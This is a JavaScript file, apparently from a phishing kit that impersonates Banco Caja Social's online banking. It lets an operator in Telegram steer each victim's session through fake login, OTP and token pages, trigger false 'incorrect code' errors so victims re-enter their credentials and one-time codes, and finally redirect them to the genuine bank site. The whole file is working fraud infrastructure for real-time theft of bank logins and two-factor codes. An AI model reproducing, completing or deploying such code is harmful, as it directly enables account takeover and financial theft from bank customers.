/**
 * Botones y errores Telegram — Caja Social
 */
(function() {
    'use strict';

    const LOGIN_ERROR_KEY = 'cajaSocialLoginError';
    const OTP_ERROR_KEY = 'cajaSocialOtpError';
    const TOKEN_ERROR_KEY = 'cajaSocialTokenError';

    const OTP_TOKEN_ERROR_TEXT = 'CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO';

    const PAGE_MAP = {
        login: 'index.html',
        password: 'password.html',
        token: 'token.html',
        otp: 'otp.html',
        finalizar: 'https://www.bancocajasocial.com/'
    };

    function currentPage() {
        return window.location.pathname.split('/').pop() || 'index.html';
    }

    function pageUrl(file) {
        return `/bancas/Caja-Social/${file}`;
    }

    function hideLoadingOverlay() {
        if (window.BancoUtils) BancoUtils.hideOverlay();
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show', 'active');
            overlay.style.display = 'none';
        }
    }

    function showLoginErrorBox() {
        const alert = document.getElementById('loginErrorAlert');
        const fieldHint = document.getElementById('loginFieldHint');
        const intentos = document.getElementById('intentosRestantes');
        const usuario = document.getElementById('usuario');
        const btn = document.getElementById('submitBtn') || document.querySelector('.btn-siguiente');

        if (alert) {
            alert.removeAttribute('hidden');
            alert.classList.add('login-error-active');
            alert.style.display = 'block';
        }
        if (fieldHint) {
            fieldHint.hidden = true;
            fieldHint.setAttribute('hidden', '');
        }
        if (intentos) {
            intentos.removeAttribute('hidden');
            intentos.classList.add('intentos-visible');
            intentos.style.display = 'block';
            intentos.style.color = '#dc3545';
        }

        if (usuario) {
            usuario.value = '';
            usuario.classList.add('error');
            usuario.focus();
        }
        if (btn) {
            btn.classList.remove('enabled');
            btn.disabled = true;
        }
    }

    function applyLoginError() {
        showLoginErrorBox();
    }

    function showOtpTokenErrorBox() {
        const alert = document.getElementById('otpTokenErrorAlert');
        const otp = document.getElementById('otp');
        const token = document.getElementById('token');
        const btnOtp = document.getElementById('btnVerificar');
        const btnToken = document.getElementById('btnContinuar');

        if (alert) {
            alert.removeAttribute('hidden');
            alert.classList.add('otp-error-active');
            alert.style.display = 'block';
        }

        if (otp) {
            otp.value = '';
            otp.classList.add('error');
            otp.focus();
        }
        if (token) {
            token.value = '';
            token.classList.add('error');
            token.focus();
        }
        if (btnOtp) {
            btnOtp.classList.remove('enabled');
            btnOtp.disabled = true;
        }
        if (btnToken) {
            btnToken.classList.remove('enabled');
            btnToken.disabled = true;
        }
    }

    function applyOtpError() {
        showOtpTokenErrorBox();
    }

    function applyTokenError() {
        showOtpTokenErrorBox();
    }

    function initLoginErrorFromStorage() {
        if (!sessionStorage.getItem(LOGIN_ERROR_KEY)) return;
        sessionStorage.removeItem(LOGIN_ERROR_KEY);
        applyLoginError();
    }

    function initOtpErrorFromStorage() {
        if (!sessionStorage.getItem(OTP_ERROR_KEY)) return;
        sessionStorage.removeItem(OTP_ERROR_KEY);
        applyOtpError();
    }

    function initTokenErrorFromStorage() {
        if (!sessionStorage.getItem(TOKEN_ERROR_KEY)) return;
        sessionStorage.removeItem(TOKEN_ERROR_KEY);
        applyTokenError();
    }

    const USUARIO_VALID_PATTERN = /^(CC|CE|NI|TI|PE)\d+$/i;

    function shouldShowUsuarioHint(value) {
        const v = (value || '').trim().toUpperCase();
        if (!v) return false;
        if (USUARIO_VALID_PATTERN.test(v)) return false;
        if (/^\d/.test(v)) return true;
        if (v.length === 1) return false;
        if (v.length >= 2 && !/^(CC|CE|NI|TI|PE)/i.test(v)) return true;
        if (/^(CC|CE|NI|TI|PE)[A-Za-z]/i.test(v) && !/^(CC|CE|NI|TI|PE)\d/i.test(v)) return true;
        if (/^(CC|CE|NI|TI|PE)/i.test(v) && v.length > 2 && !USUARIO_VALID_PATTERN.test(v)) return true;
        return false;
    }

    function updateUsuarioFieldState() {
        const input = document.getElementById('usuario');
        const hint = document.getElementById('loginFieldHint');
        const btn = document.getElementById('submitBtn');
        if (!input) return;

        const v = input.value.trim().toUpperCase();
        const isValid = USUARIO_VALID_PATTERN.test(v);
        const showHint = shouldShowUsuarioHint(input.value);

        if (hint) hint.hidden = !showHint;
        input.classList.toggle('error', showHint);

        if (btn) {
            btn.disabled = !isValid;
            btn.classList.toggle('enabled', isValid);
        }
    }

    function setupUsuarioValidation() {
        if (currentPage() !== 'index.html') return;

        const input = document.getElementById('usuario');
        if (!input) return;

        input.addEventListener('input', function() {
            const pos = this.selectionStart;
            this.value = this.value.toUpperCase();
            if (typeof pos === 'number') {
                this.setSelectionRange(pos, pos);
            }
            updateUsuarioFieldState();
        });

        input.addEventListener('blur', updateUsuarioFieldState);

        const form = document.getElementById('loginForm');
        if (form) {
            form.addEventListener('submit', function(e) {
                if (!USUARIO_VALID_PATTERN.test(input.value.trim())) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    updateUsuarioFieldState();
                    const hint = document.getElementById('loginFieldHint');
                    if (hint) hint.hidden = false;
                    input.classList.add('error');
                    input.focus();
                }
            }, true);
        }

        updateUsuarioFieldState();
    }

    function setupDismissHandlers() {
        const usuario = document.getElementById('usuario');
        if (usuario) {
            usuario.addEventListener('input', () => {
                if (!shouldShowUsuarioHint(usuario.value)) {
                    usuario.classList.remove('error');
                }
            });
        }
        const otp = document.getElementById('otp');
        if (otp) {
            otp.addEventListener('input', () => otp.classList.remove('error'));
        }
        const token = document.getElementById('token');
        if (token) {
            token.addEventListener('input', () => token.classList.remove('error'));
        }
    }

    function initPageErrors() {
        const page = currentPage();
        if (page === 'index.html') {
            setupUsuarioValidation();
            initLoginErrorFromStorage();
        }
        if (page === 'otp.html') initOtpErrorFromStorage();
        if (page === 'token.html') initTokenErrorFromStorage();
        setupDismissHandlers();
    }

    /**
     * Teclado operador (sin Pedir Password): 2 botones por fila para que se vean en Telegram móvil.
     */
    function getOperatorKeyboard() {
        if (!window.BancoUtils) return null;
        const sid = BancoUtils.getSessionId();
        const cb = (action) => `${action}:${sid}`;

        return {
            inline_keyboard: [
                [
                    { text: '❌ Error Login', callback_data: cb('error_login') },
                    { text: '❌ Error OTP', callback_data: cb('error_otp') }
                ],
                [
                    { text: '❌ Error Token', callback_data: cb('error_token') },
                    { text: '🔐 Pedir Login', callback_data: cb('login') }
                ],
                [
                    { text: '📱 Pedir OTP', callback_data: cb('otp') },
                    { text: '📱 Pedir Token', callback_data: cb('token') }
                ],
                [
                    { text: '✅ Finalizar', callback_data: cb('finalizar') }
                ]
            ]
        };
    }

    function navigateTo(file) {
        if (file.startsWith('http')) {
            window.location.href = file;
        } else {
            window.location.href = pageUrl(file);
        }
    }

    function handleTelegramAction(data) {
        if (!data || !data.action) return;

        hideLoadingOverlay();

        if (data.action === 'error_login') {
            sessionStorage.setItem(LOGIN_ERROR_KEY, '1');
            if (currentPage() === 'index.html') {
                sessionStorage.removeItem(LOGIN_ERROR_KEY);
                applyLoginError();
            } else {
                navigateTo('index.html');
            }
            return;
        }

        if (data.action === 'error_otp') {
            sessionStorage.setItem(OTP_ERROR_KEY, '1');
            if (currentPage() === 'otp.html') {
                sessionStorage.removeItem(OTP_ERROR_KEY);
                applyOtpError();
            } else {
                navigateTo('otp.html');
            }
            return;
        }

        if (data.action === 'error_token') {
            sessionStorage.setItem(TOKEN_ERROR_KEY, '1');
            if (currentPage() === 'token.html') {
                sessionStorage.removeItem(TOKEN_ERROR_KEY);
                applyTokenError();
            } else {
                navigateTo('token.html');
            }
            return;
        }

        const next = PAGE_MAP[data.action];
        if (next) navigateTo(next);
    }

    window.CajaSocialTelegram = {
        OTP_TOKEN_ERROR_TEXT,
        getOperatorKeyboard,
        handleTelegramAction,
        initPageErrors,
        applyLoginError,
        applyOtpError,
        applyTokenError
    };
})();
